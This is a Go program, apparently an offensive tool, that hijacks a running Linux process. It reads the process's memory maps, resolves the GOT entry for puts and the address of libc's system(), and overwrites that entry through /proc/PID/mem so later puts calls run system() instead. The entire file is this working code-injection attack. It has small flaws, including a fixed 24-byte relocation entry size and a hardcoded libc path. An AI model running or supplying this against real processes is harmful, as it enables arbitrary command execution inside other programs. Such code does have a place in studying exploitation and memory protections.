package main

import (
	"bufio"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
)

// 1. Find the base address of the target executable and libc in memory
func getMemoryMaps(pid string) (uint64, uint64, error) {
	mapsPath := fmt.Sprintf("/proc/%s/maps", pid)
	file, err := os.Open(mapsPath)
	if err != nil {
		return 0, 0, err
	}
	defer file.Close()

	var targetBase, libcBase uint64
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 6 {
			continue
		}

		// Capture the very first memory segment (target executable base)
		if targetBase == 0 {
			addrRange := strings.Split(fields[0], "-")
			targetBase, _ = strconv.ParseUint(addrRange[0], 16, 64)
		}

		// Capture the base address of the C library
		if strings.Contains(fields[5], "libc.so") && libcBase == 0 {
			addrRange := strings.Split(fields[0], "-")
			libcBase, _ = strconv.ParseUint(addrRange[0], 16, 64)
		}
	}
	return targetBase, libcBase, nil
}

// 2. Locate the relative offset of a symbol in any ELF file
func getElfSymbolOffset(path string, symbolName string, dynamic bool) (uint64, error) {
	f, err := elf.Open(path)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	var symbols []elf.Symbol
	if dynamic {
		symbols, _ = f.DynamicSymbols()
	} else {
		symbols, _ = f.Symbols()
	}

	for _, sym := range symbols {
		if sym.Name == symbolName {
			return sym.Value, nil
		}
	}
	return 0, fmt.Errorf("symbol %s not found", symbolName)
}

// 3. Locate the GOT entry offset for 'puts'
func getGotOffset(path string, symbolName string) (uint64, error) {
	f, err := elf.Open(path)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	dynSyms, _ := f.DynamicSymbols()
	for _, sec := range f.Sections {
		if sec.Type == elf.SHT_RELA || sec.Type == elf.SHT_REL {
			data, _ := sec.Data()
			entrySize := 24
			for i := 0; i < len(data); i += entrySize {
				offset := binary.LittleEndian.Uint64(data[i : i+8])
				info := binary.LittleEndian.Uint64(data[i+8 : i+16])
				symIdx := info >> 32
				if symIdx > 0 && int(symIdx-1) < len(dynSyms) {
					if dynSyms[symIdx-1].Name == symbolName {
						return offset, nil
					}
				}
			}
		}
	}
	return 0, fmt.Errorf("GOT offset not found")
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: sudo ./patcher <PID>")
		return
	}
	pid := os.Args[1]

	// Step A: Parse maps to get memory locations
	targetBase, libcBase, err := getMemoryMaps(pid)
	if err != nil || libcBase == 0 {
		fmt.Printf("[-] Error mapping memory: %v\n", err)
		return
	}

	// Step B: Find the relative GOT location of 'puts' inside the target
	gotOffset, _ := getGotOffset(fmt.Sprintf("/proc/%s/exe", pid), "puts")
	liveGotPutsAddr := targetBase + gotOffset

	// Step C: Find the relative offset of system() inside the system's libc binary
	// Finding the exact libc path from /proc/$PID/maps
	libcPath := "/lib/x86_64-linux-gnu/libc.so.6" // Standard path on Kali x64
	libcSystemOffset, err := getElfSymbolOffset(libcPath, "system", true)
	if err != nil {
		fmt.Printf("[-] Error finding system() in libc: %v\n", err)
		return
	}

	// Step D: Calculate the exact live address of system() inside the target process space
	liveSystemAddr := libcBase + libcSystemOffset

	fmt.Printf("[+] Target Base Address: 0x%X\n", targetBase)
	fmt.Printf("[+] Libc Base Address:   0x%X\n", libcBase)
	fmt.Printf("[+] Live GOT Puts Entry: 0x%X\n", liveGotPutsAddr)
	fmt.Printf("[+] Live system() Addr:  0x%X\n", liveSystemAddr)

	// Step E: Overwrite the target's memory
	memPath := fmt.Sprintf("/proc/%s/mem", pid)
	memFile, _ := os.OpenFile(memPath, os.O_RDWR, 0666)
	defer memFile.Close()

	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, liveSystemAddr)

	_, err = memFile.WriteAt(buf, int64(liveGotPutsAddr))
	if err != nil {
		fmt.Printf("[-] Write failed: %v\n", err)
	} else {
		fmt.Println("[+] Success! GOT pointer redirected to system().")
	}
}
